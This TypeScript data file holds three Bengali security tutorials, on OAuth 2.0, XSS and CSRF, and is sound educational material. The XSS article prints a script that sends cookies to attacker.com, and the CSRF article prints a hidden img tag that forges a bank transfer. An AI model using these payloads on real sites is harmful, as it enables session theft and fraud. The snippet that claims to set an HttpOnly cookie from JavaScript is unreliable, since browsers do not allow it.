export type TArticle = {
  title: string;
  slug: string;
  category: 'Security';
  content: string;
};

export const articles: TArticle[] = [
  {
    title: 'OAuth 2.0: What, Why, When and How works (High Level Overview)',
    slug: 'oauth-2-0-what-why-when-and-how-works',
    category: 'Security',
    content: `
    
## OAuth 2.0: What, Why, When and How works (High Level Overview)

OAuth 2.0 একটি বহুল ব্যবহৃত অথরাইজেশন ফ্রেমওয়ার্ক। এটি মূলত তৈরি হয়েছে ব্যবহারকারীর পরিচয় এবং পাসওয়ার্ড শেয়ার না করেই থার্ড-পার্টি অ্যাপ্লিকেশনকে সীমিত অ্যাক্সেস দেওয়ার জন্য। এই আর্টিকেলে আমরা OAuth 2.0 এর বিভিন্ন দিক, কার্যকারিতা নিয়ে আলোচনা করব।

### OAuth 2.0 কি?

OAuth 2.0 একটি অথরাইজেশন প্রোটোকল। এটি কোনো ইউজারকে তার ইউজারনেম ও পাসওয়ার্ড শেয়ার না করে অন্য কোনো অ্যাপলিকেশনকে তার অ্যাকাউন্টের কিছু রিসোর্স ব্যবহারের অনুমতি দেয়। উদাহরণস্বরূপ, আপনি যখন \`Login with Google\` অপশনটি ব্যবহার করেন, তখন আপনি আপনার Google অ্যাকাউন্টের তথ্য সরাসরি সেই অ্যাপলিকেশনের সাথে শেয়ার করেন না। বরং, OAuth 2.0 এর মাধ্যমে অ্যাপটি আপনার Google অ্যাকাউন্টের কিছু নির্দিষ্ট তথ্যের (যেমন: নাম, ইমেইল) অ্যাক্সেস পায়, আপনার পাসওয়ার্ড ছাড়াই।

### কেন OAuth 2.0 প্রয়োজন?

স্বাভাবিকভাবে, থার্ড-পার্টি অ্যাপ্লিকেশনগুলোকে ব্যবহারকারীর অ্যাকাউন্টে অ্যাক্সেস পেতে ইউজারনেম ও পাসওয়ার্ডের উপর নির্ভর করতে হতো। এতে অনেক নিরাপত্তা ঝুঁকি ছিল, যেমন:

- অ্যাপ্লিকেশনটি যদি হ্যাক হয়, তাহলে আপনার অ্যাকাউন্টের তথ্য চুরি হয়ে যেতে পারত।
- অ্যাপ্লিকেশনটির নিরাপত্তা দুর্বল হলে হ্যাকাররা আপনার অ্যাকাউন্টে প্রবেশ করতে পারত।
- আপনি যদি অ্যাপ্লিকেশনটির উপর থেকে ট্রাস্ট হারিয়ে ফেলেন, তাহলে পাসওয়ার্ড পরিবর্তন করা ছাড়া অন্য কোনো উপায় থাকত না।

OAuth 2.0 এই সমস্যাগুলো সমাধান করে। এটি অ্যাপ্লিকেশনগুলোকে একটি "অ্যাক্সেস টোকেন" ব্যবহার করে সীমিত অ্যাক্সেস প্রদান করে। এই টোকেনগুলো নির্দিষ্ট সময়ের জন্য বৈধ থাকে এবং নির্দিষ্ট কিছু রিসোর্সের অ্যাক্সেস প্রদান করে। ফলে, ব্যবহারকারীর অ্যাকাউন্টের সম্পূর্ণ নিয়ন্ত্রণ থাকে এবং নিরাপত্তা ঝুঁকি কমে যায়।

এছাড়া OAuth 2.0 হলো ওপেন সোর্স প্রোটোকল, সিকিউরিটি এবং স্কেলাবিলিটি বৃদ্ধি করার জন্য তৈরি ও মেইনটেইন করা হয়েছে তাই বড় বড় কোম্পানিগুলো আলাদা অথরাইজেশন সিস্টেম তৈরি করার পরিবর্তে OAuth 2.0 ফ্রেমওয়ার্ক ব্যবহার করে থাকে।

### OAuth 2.0 কিভাবে কাজ করে?

OAuth 2.0 এর মূল প্রক্রিয়াটি কয়েকটি ধাপে সম্পন্ন হয়:

- **রিসোর্স ওনার**: ব্যবহারকারী যার ডেটা অ্যাক্সেস করা হবে।
- **অ্যাপ্লিকেশন অনুরোধ পাঠায়**:
   - গেম অ্যাপ Google-এর অথোরাইজেশন সার্ভারে একটি অনুরোধ পাঠায়, যাতে ক্লায়েন্ট আইডি, রিডাইরেক্ট URI, এবং স্কোপ (যেমন \`name\`,\`email\`, \`photo\`) থাকে।
- **ব্যবহারকারীর সম্মতি**:
   - Google ব্যবহারকারীকে একটি সম্মতি পেইজ দেখায়, যেখানে অনুরোধ করা ডেটা (যেমন ইমেইল, নাম, ফটো) তালিকাভুক্ত করা হয়।
   - ব্যবহারকারী অনুমতি দিলে, Google একটি **অ্যাক্সেস টোকেন** ইস্যু করে।
- **ডেটা অ্যাক্সেস**:
   - গেম অ্যাপ অ্যাক্সেস টোকেন ব্যবহার করে Google-এর রিসোর্স সার্ভার (যেমন UserInfo Endpoint) থেকে ব্যবহারকারীর ডেটা (যেমন ইমেইল, নাম) পায়।

নিচের চিত্রটি OAuth 2.0 এর মূল প্রবাহ দেখায়:

 \`\`\`mermaid
sequenceDiagram
  participant User
  participant Client
  participant AuthorizationServer
  participant ResourceServer

  User->>Client: গেম অ্যাপ্লিকেশন ব্যবহার করতে চায় Google দিয়ে।
  Client->>AuthorizationServer: গেম অথরাইজেশন রিকোয়েস্ট পাঠায় (Ex: Google)
  AuthorizationServer->>User: ব্যবহারকারীর পরিচয় যাচাই/ অনুমতি চায়
  User->>AuthorizationServer: অনুমতি প্রদান করে
  AuthorizationServer->>Client: অ্যাক্সেস টোকেন প্রদান করে এবং ডাটাবেজ স্টোর করে।
  Client->>ResourceServer: এই অ্যাক্সেস টোকেন দিয়ে রিসোর্স রিকোয়েস্ট করে।
  ResourceServer->>Client:  রিসোর্স সার্ভার টোকেন চেক করে  রিসোর্স প্রদান করে।
\`\`\`

![OAuth2.0 Flow Image](https://res.cloudinary.com/karim-cloude/image/upload/fl_preserve_transparency/v1741008374/OAuth2.0_wzsbrf.jpg?_s=public-apps)

### OAuth 2.0 এর ব্যবহার

- **Google দিয়ে লগইন:** বিভিন্ন ওয়েবসাইটে Google, Facebook বা অন্য কোনো প্ল্যাটফর্ম দিয়ে লগইন করার অপশন থাকে। এখানে OAuth 2.0 ব্যবহৃত হয়।
- **থার্ড-পার্টি অ্যাপ্লিকেশন অ্যাক্সেস:** অনেক অ্যাপ্লিকেশন আপনার Google Drive, Dropbox বা অন্য কোনো ক্লাউড স্টোরেজের ফাইল অ্যাক্সেস করার অনুমতি চায়। এখানেও OAuth 2.0 ব্যবহৃত হয়।
- **API অ্যাক্সেস:** বিভিন্ন API (Application Programming Interface) যেমন Twitter API, Facebook API অ্যাক্সেস করার জন্য OAuth 2.0 ব্যবহৃত হয়।

### সুবিধা

- **নিরাপত্তা:** ব্যবহারকারীর ইউজারনেম ও পাসওয়ার্ড শেয়ার করার প্রয়োজন হয় না।
- **সীমিত অ্যাক্সেস:** অ্যাপ্লিকেশনকে শুধুমাত্র প্রয়োজনীয় রিসোর্সের অ্যাক্সেস দেওয়া যায়।
- **সহজ ব্যবহার:** ব্যবহারকারী সহজেই অ্যাপ্লিকেশনকে দেওয়া অনুমতি বাতিল করতে পারে।
- **বিভিন্ন প্ল্যাটফর্ম সমর্থন:** ওয়েব, মোবাইল এবং ডেস্কটপ অ্যাপ্লিকেশনসহ বিভিন্ন প্ল্যাটফর্মে ব্যবহার করা যায়।

### অসুবিধা

- **জটিলতা:** OAuth 2.0 এর প্রক্রিয়াটি কিছুটা জটিল হতে পারে, বিশেষ করে নতুন ডেভেলপারদের জন্য।
- **কনফিগারেশন:** সঠিকভাবে কনফিগারেশন না করলে নিরাপত্তা ঝুঁকি থাকতে পারে।

### CORS (Cross-Origin Resource Sharing)

CORS একটি নিরাপত্তা ব্যবস্থা যা ব্রাউজারকে একটি ডোমেইন থেকে অন্য ডোমেইনে রিসোর্স অ্যাক্সেস করতে বাধা দেয়। OAuth 2.0 এর ক্ষেত্রে, ক্লায়েন্ট অ্যাপ্লিকেশন যদি অন্য ডোমেইনে অবস্থিত রিসোর্স সার্ভার থেকে ডেটা অ্যাক্সেস করতে চায়, তাহলে CORS একটি সমস্যা হতে পারে।

এই সমস্যা সমাধানের জন্য, রিসোর্স সার্ভারকে CORS হেডার কনফিগার করতে হয়। \`Access-Control-Allow-Origin\` হেডার ব্যবহার করে কোন ডোমেইনগুলোকে রিসোর্স অ্যাক্সেস করার অনুমতি দেওয়া হবে, তা নির্দিষ্ট করা যায়।

---

### JWT কেন ব্যবহার করা হয় এবং কিভাবে অতিরিক্ত তথ্য যোগ করে ক্লায়েন্ট অ্যাপ রিসোর্স সার্ভারের সাথে সংযোগ করে?

JWT (JSON Web Token) হল একটি জনপ্রিয় টোকেন ফরম্যাট যা অথেন্টিকেশন এবং অথোরাইজেশনের জন্য ব্যবহৃত হয়। এটি হালকা, স্ব-ধারণকারী (self-contained), এবং সহজে পাঠানো ও ডিকোড করা যায়। এটি অতিরিক্ত তথ্য যোগ করে ক্লায়েন্ট অ্যাপ রিসোর্স সার্ভারের সাথে সংযোগ করে সহজে কাজ করার জন্য ব্যবহার করা হয়।

### JWT কেন ব্যবহার করা হয়?

- **স্ব-ধারণকারী (Self-Contained)**:
   - JWT টোকেনের মধ্যে সমস্ত প্রয়োজনীয় তথ্য (যেমন ব্যবহারকারীর আইডি, রোল, স্কোপ, এক্সপায়ারেশন টাইম ইত্যাদি) থাকে। এর মানে হল রিসোর্স সার্ভারকে টোকেন ভেরিফাই করার জন্য অতিরিক্ত ডেটাবেস কুয়েরি করার প্রয়োজন হয় না।
- **হালকা এবং সহজে পাঠানো যায়**:
   - JWT টোকেনগুলি সাধারণত ছোট এবং বেস৬৪-এনকোডেড, তাই এগুলি সহজে HTTP হেডার, URL, বা POST রিকোয়েস্টের বডিতে পাঠানো যায়।
- **সহজে ডিকোড করা যায়**:
   - JWT টোকেনগুলি বেস৬৪-এনকোডেড, তাই যে কেউ এগুলি ডিকোড করে পেলোড (তথ্য) পড়তে পারে। তবে, টোকেনটি সাইন করা থাকে, তাই কেউ এটি পরিবর্তন করতে পারে না।
- **অতিরিক্ত তথ্য (Claims) পাঠানো**:
   - JWT টোকেনের পেলোডে আপনি যেকোনো অতিরিক্ত তথ্য (claims) যোগ করতে পারেন, যেমন ব্যবহারকারীর রোল, স্কোপ, বা অন্যান্য মেটাডেটা। এটি রিসোর্স সার্ভারকে অতিরিক্ত তথ্য প্রদান করে।

OAuth 2.0 একটি শক্তিশালী এবং বহুল ব্যবহৃত অথরাইজেশন ফ্রেমওয়ার্ক। এটি থার্ড-পার্টি অ্যাপ্লিকেশনগুলোকে নিরাপদে রিসোর্স অ্যাক্সেস করার সুযোগ দেয়। JWT টোকেন ব্যবহার করে এটি আরোও অপ্টিমাইজ ভাবে ব্যবহার করা যায়। ডেভেলোপার সুবিধা এবং নিরাপত্তা বৃদ্ধি এছাড়া একটি একক স্ট্যান্ডার্ড এর জন্য বড় বড় কোম্পানিগুলো এটি ব্যবহার করে তাদের অথরাইজেশন সিস্টেম তৈরি করে এবং তাদের এই সিস্টেমকে ব্যবহার করে ইউজার অন্যান্য অ্যাপ্লিকেশনে অ্যাক্সেস দেয় যেমন Google, Facebook, Twitter ইত্যাদি। যা ইউজার এর জন্য সুবিধা এবং নিরাপত্তা বৃদ্ধি করে।
    
    `,
  },
  {
    title: 'XSS Attack: হ্যাকাররা কীভাবে এক লাইনের কোড দিয়ে ডেটা চুরি করে',
    slug: 'xss-attack-how-hackers-steal-data-with-a-single-line-of-code',
    category: 'Security',
    content: `  
## XSS অ্যাটাক: হ্যাকাররা কীভাবে এক লাইনের কোড দিয়ে ডেটা চুরি করে

XSS (Cross-Site Scripting) একটি ওয়েব সিকিউরিটি ভালনারেবিলিটি। এর মাধ্যমে অ্যাটাকাররা ভিকটিমের ব্রাউজারে ক্ষতিকর স্ক্রিপ্ট প্রবেশ করিয়ে কুকি, সেশন টোকেন এবং অন্যান্য সংবেদনশীল তথ্য চুরি করতে পারে।

### XSS কী?

XSS অ্যাটাকগুলো মূলত তখনই ঘটে যখন কোনো ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর কাছ থেকে ইনপুট নিয়ে তা স্যানিটাইজ না করেই আউটপুটে প্রদর্শন করে। এর ফলে অ্যাটাকার ক্ষতিকর JavaScript কোড ইনপুট হিসেবে প্রবেশ করিয়ে ব্যবহারকারীর ব্রাউজারে এক্সিকিউট করতে পারে।

### XSS এর প্রকারভেদ

XSS মূলত তিন প্রকার:

1.  Stored XSS:
    এই ধরনের অ্যাটাকে, ক্ষতিকর স্ক্রিপ্টগুলো সার্ভারে জমা থাকে (যেমন: কোনো ডাটাবেজে)। যখন কোনো ইউজার সেই পেজ ভিজিট করে, তখন স্ক্রিপ্টটি সার্ভার থেকে লোড হয়ে ইউজারের ব্রাউজারে এক্সিকিউট হয়।

2.  Reflected XSS:
    এই অ্যাটাকে, ক্ষতিকর স্ক্রিপ্টটি সরাসরি HTTP রিকোয়েস্টের মাধ্যমে সার্ভারে পাঠানো হয়। সার্ভার সেই স্ক্রিপ্টটিকে রেসপন্সের সাথে রিফ্লেক্ট করে, যা ইউজারের ব্রাউজারে এক্সিকিউট হয়।

3.  DOM-based XSS:
    এই অ্যাটাকে, ক্লায়েন্ট-সাইড স্ক্রিপ্ট ব্যবহার করে DOM (Document Object Model) ম্যানিপুলেট করা হয়। ক্ষতিকর স্ক্রিপ্টটি URL অথবা অন্য কোনো ক্লায়েন্ট-সাইড ডেটা সোর্স থেকে আসে এবং সরাসরি ব্রাউজারে এক্সিকিউট হয়।

### XSS কিভাবে কাজ করে?

XSS অ্যাটাকের মূল প্রক্রিয়া নিচে দেওয়া হলো:

1.  অ্যাটাকার একটি ক্ষতিকর স্ক্রিপ্ট তৈরি করে।
2.  স্ক্রিপ্টটিকে কোনো ইনপুট ফিল্ডের মাধ্যমে ওয়েবসাইটে প্রবেশ করানো হয় (যেমন: কমেন্ট বক্স, সার্চ বার)।
3.  যখন কোনো ইউজার সেই পেজ ভিজিট করে, তখন স্ক্রিপ্টটি ব্রাউজারে এক্সিকিউট হয়।
4.  স্ক্রিপ্টটি ইউজারের কুকি, সেশন টোকেন অথবা অন্যান্য সংবেদনশীল তথ্য চুরি করে অ্যাটাকারের কাছে পাঠিয়ে দেয়।

### কোডিং উদাহরণ

ধরুন, একটি ওয়েবসাইটে একটি সার্চ বার আছে। যদি সাইটটি ইনপুট সঠিকভাবে স্যানিটাইজ না করে, তাহলে অ্যাটাকার নিচের স্ক্রিপ্টটি প্রবেশ করাতে পারে:

\`\`\`html
<script>
  window.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
\`\`\`

এই স্ক্রিপ্টটি ইউজারের কুকি \`attacker.com\`-এ পাঠিয়ে দেবে।

এছাড়া কুয়েরি প্যারামিটারে স্ক্রিপ্ট এক্সিকিউট করানোর একটি অন্য উদাহরণ হলো:

\`\`\`html
https://example.com/search?query=
<script>
  alert('XSS');
</script>
\`\`\`

### XSS প্রতিরোধ করার উপায়

XSS থেকে বাঁচার জন্য কিছু গুরুত্বপূর্ণ পদক্ষেপ নিচে দেওয়া হলো:

- ইনপুট ভ্যালিডেশন:
  ব্যবহারকারীর কাছ থেকে আসা সকল ইনপুট ভ্যালিডেট করতে হবে। অপ্রত্যাশিত ক্যারেক্টার এবং কোড ফিল্টার করতে হবে।

\`\`\`javascript
function sanitizeInput(input) {
  return input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
\`\`\`

- আউটপুট এনকোডিং:
  ডাটাবেস বা অন্য কোনো সোর্স থেকে ডেটা নিয়ে যখন তা ওয়েবসাইটে দেখানো হয়, তখন তা অবশ্যই এনকোড করতে হবে। HTML এনকোডিং সবচেয়ে বেশি ব্যবহৃত হয়।

\`\`\`js
// Assuming the unsafe data is from the URL's query string
const urlParams = new URLSearchParams(window.location.search);
const unsafeData = urlParams.get('data');

// Sanitize the input by creating a text node
const sanitizedData = document.createTextNode(unsafeData);

// Insert the sanitized data into an element, like a div with id "output"
document.getElementById('output').appendChild(sanitizedData);
\`\`\`

- Content Security Policy (CSP):
  CSP ব্যবহার করে ব্রাউজারকে বলে দেওয়া যায় যে কোন সোর্স থেকে স্ক্রিপ্ট লোড করা যাবে। এর মাধ্যমে ক্ষতিকর স্ক্রিপ্ট এক্সিকিউট হওয়া থেকে বাঁচানো যায়।

\`\`\`html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'"
/>
\`\`\`

- HttpOnly কুকি:
  এই ধরনের কুকি ব্রাউজারের জন্য অ্যাক্সেস করা যাবে, কিন্তু জাভাস্ক্রিপ্ট এক্সেস করা যাবে না। এটি XSS অ্যাটাক থেকে বাঁচার জন্য অত্যন্ত গুরুত্বপূর্ণ।

\`\`\`js
// Set a cookie in JavaScript with the same properties
document.cookie = 'cookie_name=cookie_value; path=/; max-age=' + 3600 + '; secure; HttpOnly';
\`\`\`

- স্যানিটাইজ লাইব্রেরি ব্যবহার:
  স্যানিটাইজ লাইব্রেরি ব্যবহার করে ইনপুট স্যানিটাইজ করা যায়। এটি কোড রিপিটেশন এবং ভুল থেকে বাঁচানোর জন্য অত্যন্ত গুরুত্বপূর্ণ।

- innerText এর ব্যবহার:
  innerHTML এর পরিবর্তে innerText ব্যবহার করা যেতে পারে। innerText টেক্সট প্রদর্শন করে যা এক্সিকিউটেবল নয়।

- নিয়মিত আপডেট:
  ওয়েবসাইটের সফটওয়্যার এবং লাইব্রেরিগুলো সবসময় আপ-টু-ডেট রাখতে হবে। আপডেটের মাধ্যমে সিকিউরিটি প্যাচগুলো ইনস্টল হয়ে যায়, যা XSS অ্যাটাক থেকে রক্ষা করে।

### কেন XSS প্রতিরোধ করা দরকার?

XSS অ্যাটাক একটি ওয়েবসাইটের জন্য মারাত্মক ক্ষতি ডেকে আনতে পারে। এর মাধ্যমে অ্যাটাকার ইউজারের অ্যাকাউন্ট কন্ট্রোল নিতে পারে, সংবেদনশীল তথ্য চুরি করতে পারে এবং ওয়েবসাইটে ক্ষতিকর কনটেন্ট প্রবেশ করিয়ে সাইটের সুনাম নষ্ট করতে পারে। তাই, XSS প্রতিরোধ করা অত্যন্ত জরুরি।

---

XSS অ্যাটাক থেকে বাঁচতে হলে ডেভেলপার এবং ওয়েবসাইট মালিকদের সচেতন থাকতে হবে। সঠিক ইনপুট ভ্যালিডেশন, আউটপুট এনকোডিং এবং CSP ব্যবহারের মাধ্যমে XSS অ্যাটাক সফলভাবে প্রতিরোধ করা সম্ভব।
    `,
  },
  {
    title:
      'CSRF Attacks: কিভাবে হ্যাকাররা ইউজারদের অ্যাকাউন্ট হাইজ্যাক করতে পারে!',
    slug: 'csrf-attacks-how-hackers-hijack-user-accounts',
    category: 'Security',
    content: `

## CSRF Attacks: কিভাবে হ্যাকাররা ইউজারদের অ্যাকাউন্ট হাইজ্যাক করতে পারে!

Cross-Site Request Forgery (CSRF) একটি ওয়েব সিকিউরিটি ভালনারেবিলিটি। এর মাধ্যমে অ্যাটাকার ইউজারদের না জানিয়েই তাদের কিছু অ্যাকশন পারফর্ম করতে বাধ্য করতে পারে। এটা মূলত একটা সাইটের উপর ইউজারের ব্রাউজারের যে ট্রাস্ট থাকে, সেটাকে কাজে লাগায়।

### CSRF কি?

CSRF অ্যাটাকগুলো ঘটে যখন কোনো ম্যালিশিয়াস ওয়েবসাইট, ইমেইল, ব্লগ, ইনস্ট্যান্ট মেসেজ বা প্রোগ্রাম ইউজারের ওয়েব ব্রাউজারকে দিয়ে কোনো ট্রাস্টেড সাইটে \`https://facebook.com\` অ্যাকশন পারফর্ম করায়, যেখানে ইউজার অথেনটিকেটেড। CSRF অ্যাটাকগুলো মূলত স্টেট-চেঞ্জিং রিকোয়েস্টগুলোকে টার্গেট করে, ডেটা চুরি করা এর উদ্দেশ্য নয়, কারণ অ্যাটাকার ফর্জড রিকোয়েস্টের রেসপন্স দেখতে পায় না।

### কেন CSRF গুরুত্বপূর্ণ

CSRF এর কারণে যা হতে পারে:

- অ্যাকাউন্ট কম্প্রোমাইজ
- অননুমোদিত ফান্ড ট্রান্সফার
- ডেটা পরিবর্তন
- ম্যালওয়্যার ছড়ানো

### CSRF কিভাবে কাজ করে

  - ** ইউজার লগ ইন:** ইউজার একটা ট্রাস্টেড ওয়েবসাইটে (যেমন \`bank.com\`) অথেনটিকেট করে। সাইটটি ইউজারের ব্রাউজারে একটা সেশন কুকি সেট করে।
- **অ্যাটাকারের সাইট:** যেকোনো ওয়েতে ইউজার অ্যাটাকারের কন্ট্রোল করা একটা ম্যালিশিয়াস ওয়েবসাইট (\`attacker.com\`) ভিজিট করে।
- **ফর্জড রিকোয়েস্ট:** অ্যাটাকারের সাইটে HTML কোড থাকে যা ট্রাস্টেড সাইটে একটা রিকোয়েস্ট ট্রিগার করে (যেমন \`bank.com/transfer?amount=1000&to=attacker\`)। এটা একটা ইমেজ ট্যাগ, ফর্ম বা জাভাস্ক্রিপ্টের মাধ্যমে করা হয়।
- **ব্রাউজার রিকোয়েস্ট পাঠায়:** ইউজারের ব্রাউজার অটোমেটিকভাবে \`bank.com\` এর সেশন কুকি যুক্ত করে রিকোয়েস্ট পাঠায় রিসোর্চ সার্ভার। যদি সার্ভারে CORS সেটআপ থাকে অথবা ব্রাউজার CORS ফিচার এর জন্য রিকোয়েস্ট সফল নাও হতে পারে তাই CORS বাইপাস এর জন্য অ্যাটাকারের অ্যাডিশনাল কনফিগারেশন করতে হতে পারে।
- **ব্যাংক রিকোয়েস্ট এক্সিকিউট করে:** \`https://bank.com\` রিকোয়েস্ট রিসিভ করে, কুকি ভ্যালিডেট করে এবং ট্রান্সফার প্রসেস করে, যেন ইউজার নিজেই এই রিকোয়েস্ট করেছে।

### কখন CSRF হতে পারে

CSRF তখনই সম্ভব যখন:

- সাইট শুধুমাত্র কুকিজের উপর নির্ভর করে অথেনটিকেশনের জন্য।
- কুকি তৈরি সময় অপশন গুলো প্রপার ব্যবহার না করা।
- সার্ভারে কোনো প্রোপার CORS কনফিগারেশন সেট না করা।
- সাইটে কোনো প্রোপার CSRF প্রোটেকশন না থাকা।
- ইউজার টার্গেট সাইটে কারেন্টলি অথেনটিকেটেড থাকা।

### CSRF অ্যাটাকের প্রকার

- **GET-based CSRF:** অ্যাটাকার ম্যালিশিয়াস প্যারামিটার দিয়ে একটা URL তৈরি করে। এটা প্রায়ই \`<img>\` ট্যাগ বা লিংকের মাধ্যমে ডেলিভার করা হয়।
- **POST-based CSRF:** অ্যাটাকার একটা হিডেন ফর্ম তৈরি করে যা অটোমেটিকভাবে টার্গেট সাইটে সাবমিট হয়। এর জন্য ইউজারকে ফর্ম থাকা একটা পেজ ভিজিট করতে হয়।

### রিয়েল-লাইফ উদাহরণ

- **ইমেইল অ্যাড্রেস পরিবর্তন:** অ্যাটাকার একটা ফোরামে ইউজারের ইমেইল অ্যাড্রেস পরিবর্তন করার জন্য একটা রিকোয়েস্ট ফর্জ করতে পারে, যা অ্যাকাউন্ট টেকওভারের দিকে নিয়ে যেতে পারে।
- **সোশ্যাল মিডিয়া অ্যাকশন:** অ্যাটাকার ইউজারকে না জানিয়েই একটা পেজে "লাইক" দিতে বা স্ট্যাটাস আপডেট করতে পারে।
- **ব্যাংকিং ট্রানজেকশন:** শুরুতে যে উদাহরণ দেওয়া হয়েছে, সেভাবে ফান্ড ট্রান্সফার করা।

### কোডিং উদাহরণ

ধরা যাক, একটা ব্যাংকের মানি ট্রান্সফার করার জন্য একটা URL আছে:

\`https://bank.example/transfer.do?acct=VICTIM-ACCOUNT&amount=100&for=EvilUser\`

অ্যাটাকার ভিকটিমের কাছে নিচের HTML কোডটি পাঠাতে পারে:

\`\`\`html
<img
  src="<https://bank.example/transfer.do?acct=VICTIM-ACCOUNT&amount=100&for=EvilUser>"
  width="0"
  height="0"
/>

\`\`\`

যদি ইউজার \`bank.example\` এ লগইন করা থাকে, তাহলে এই \`<img>\` ট্যাগটি \`EvilUser\` এর অ্যাকাউন্টে ১০০ ডলার ট্রান্সফার করে দেবে, যখন ভিকটিম HTML দেখবে (যেমন কোনো ফোরাম পোস্ট বা ইমেইলে)।

### সলিউশন ও প্রিভেনশন

- **CSRF টোকেন (Synchronizer Token Pattern):**
    - সার্ভার প্রত্যেক ইউজার সেশনের জন্য একটা ইউনিক, আনপ্রেডিক্টেবল টোকেন জেনারেট করে।
    - এই টোকেন সব ফর্মের মধ্যে একটা হিডেন ফিল্ড হিসেবে যোগ করা হয়।
    - যখন ফর্ম সাবমিট করা হয়, সার্ভার ভেরিফাই করে যে রিকোয়েস্টের টোকেনটা ইউজারের সেশনে স্টোর করা টোকেনের সাথে ম্যাচ করছে কিনা।

উদাহরণ (HTML):

\`\`\`html
<form
  action="/transfer"
  method="POST"
>
  <input
    type="hidden"
    name="csrf_token"
    value="UNIQUE_CSRF_TOKEN"
  />
  <input
    type="text"
    name="amount"
  />
  <button type="submit">Transfer</button>
</form>

\`\`\`

\- উদাহরণ (সার্ভার-সাইড ভেরিফিকেশন):

\`\`\`jsx
if (req.method === 'POST') {
  const csrfToken = req.body.csrf_token;
  if (csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Forbidden');
  }
  // ... process the transfer
}

\`\`\`

- **ডাবল সাবমিট কুকি:**
    - সার্ভার একটা রেন্ডম বা এলোমেলো ভ্যালু তৈরি করে। এই ভ্যালুটা কুকিতে এবং ফর্মের একটা ফিল্ড হিসেবে সেট করে।
    - যখন ফর্ম সাবমিট করা হয়, তখন সার্ভার দেখে কুকির ভ্যালু আর ফর্মের ফিল্ডের ভ্যালু একই কিনা। যদি মিলে যায়, তার মানে রিকোয়েস্টটা সেইম সাইট থেকে এসেছে।
    - এটা সেইম-অরিজিন পলিসি ব্যবহার করে। এর ফলে অ্যাটাকার কুকির ভ্যালু সহজে বের করতে পারে না।
    
    সহজ ভাষায়, সার্ভার একটা গোপন কোড তৈরি করে কুকিতে রাখে এবং ফর্মের সাথে মিলিয়ে দেখে। যদি কোড মিলে যায়, তাহলে বোঝা যায় রিকোয়েস্টটা আসল।
    
- **সেইমসাইট কুকি অ্যাট্রিবিউট:**
    - \`SameSite=Strict\`: এই অ্যাট্রিবিউটটি কুকিকে শুধুমাত্র সেই রিকোয়েস্টের সাথেই পাঠাতে দেয়, যা একই সাইট থেকে এসেছে। এর মানে হলো, যদি কেউ অন্য কোনো ওয়েবসাইট থেকে আপনার সাইটে ঢোকার চেষ্টা করে, তাহলে এই কুকি ব্রাউজারের সাথে পাঠানো হবে না। এটা CSRF অ্যাটাক থেকে খুব ভালো প্রোটেকশন দেয়, কিন্তু কিছু ক্ষেত্রে ব্যবহারকারীর অভিজ্ঞতা খারাপ হতে পারে, কারণ অন্য সাইটের লিংকে ক্লিক করলে কুকি না থাকার কারণে কিছু ফিচার কাজ নাও করতে পারে।
    - \`SameSite=Lax\`: এই অ্যাট্রিবিউটটি \`Strict\` এর চেয়ে কিছুটা কম কঠোর। এটা কুকিকে সেইম-সাইট রিকোয়েস্টের সাথে তো পাঠায়ই, পাশাপাশি টপ-লেভেল নেভিগেশন (যেমন: লিংকে ক্লিক করে অন্য সাইট থেকে আসা) রিকোয়েস্টের সাথেও পাঠায়। এটা মূলত নিরাপত্তা এবং ব্যবহারযোগ্যতার মধ্যে একটা ভারসাম্য রক্ষা করে। CSRF অ্যাটাকের বিরুদ্ধে এটা কিছু প্রোটেকশন দেয়, কিন্তু \`Strict\` এর মতো পুরোপুরি নয়।
    - \`SameSite=None; Secure\`: এই অ্যাট্রিবিউটটি কুকিকে সব রিকোয়েস্টের সাথে পাঠাতে দেয়, তবে এর জন্য HTTPS কানেকশন থাকা বাধ্যতামূলক। \`Secure\` অ্যাট্রিবিউট নিশ্চিত করে যে কুকি শুধুমাত্র এনক্রিপ্টেড কানেকশনের মাধ্যমেই পাঠানো হবে, যা কুকি চুরি হওয়া থেকে রক্ষা করে। \`SameSite=None\` ব্যবহার করলে CSRF অ্যাটাকের ঝুঁকি থাকে, তাই এর সাথে CSRF টোকেনের মতো অন্য নিরাপত্তা ব্যবস্থা ব্যবহার করা উচিত। এটি ব্যবহার না করাই ভালো।
- **রেফারার হেডার ভ্যালিডেশন:**
    - \`Referer\` হেডার চেক করে নিশ্চিত করা যে রিকোয়েস্ট সেইম ডোমেইন থেকে এসেছে।
    - এটা আনরিলায়েবল হতে পারে, কারণ \`Referer\` হেডার সহজেই স্পুফ করা যায় বা ক্লায়েন্ট এটাকে বাদ দিতে পারে।
- **ইউজার ইন্টার‍্যাকশন (হাই-ভ্যালু ট্রানজেকশন):**
    - সেনসিটিভ অ্যাকশন কমপ্লিট করার আগে ইউজারদের রি-অথেনটিকেট করতে বা কনফার্ম করতে বলা (যেমন পাসওয়ার্ড বা OTP এন্টার করা)।

### এছাড়াও

- **API এন্ডপয়েন্ট:** CSRF টোকেন বা অন্য কোনো অথেনটিকেশন মেকানিজম (যেমন API কি, OAuth) দিয়ে API এন্ডপয়েন্টগুলো প্রোটেক্ট করুন।
- **AJAX রিকোয়েস্ট:** AJAX রিকোয়েস্টের জন্য রিকোয়েস্ট হেডারে CSRF টোকেন ইনক্লুড করুন।
- **ফ্রেমওয়ার্ক-স্পেসিফিক প্রোটেকশন:** বেশিরভাগ ওয়েব ফ্রেমওয়ার্ক (যেমন Django, Ruby on Rails, Laravel) বিল্ট-ইন CSRF প্রোটেকশন দিয়ে থাকে। এই ফিচারগুলো ব্যবহার করুন।
- **নিয়মিত সিকিউরিটি অডিট:** পটেনশিয়াল CSRF ভালনারেবিলিটি আইডেন্টিফাই ও অ্যাড্রেস করার জন্য নিয়মিত সিকিউরিটি অডিট ও পেনেট্রেশন টেস্টিং কন্ডাক্ট করুন।
- **ইউজারদের এডুকেট করুন:** ইউজারদের সাসপিসিয়াস লিংকে ক্লিক করা বা আনট্রাস্টেড ওয়েবসাইট ভিজিট করা থেকে সাবধান থাকতে ট্রেন করুন।
- **ডিফেন্স ইন ডেপথ:** CSRF অ্যাটাকের রিস্ক কমানোর জন্য মাল্টিপল লেয়ারের ডিফেন্স ব্যবহার করুন। শুধুমাত্র একটা প্রোটেকশন মেকানিজমের উপর নির্ভর করবেন না।

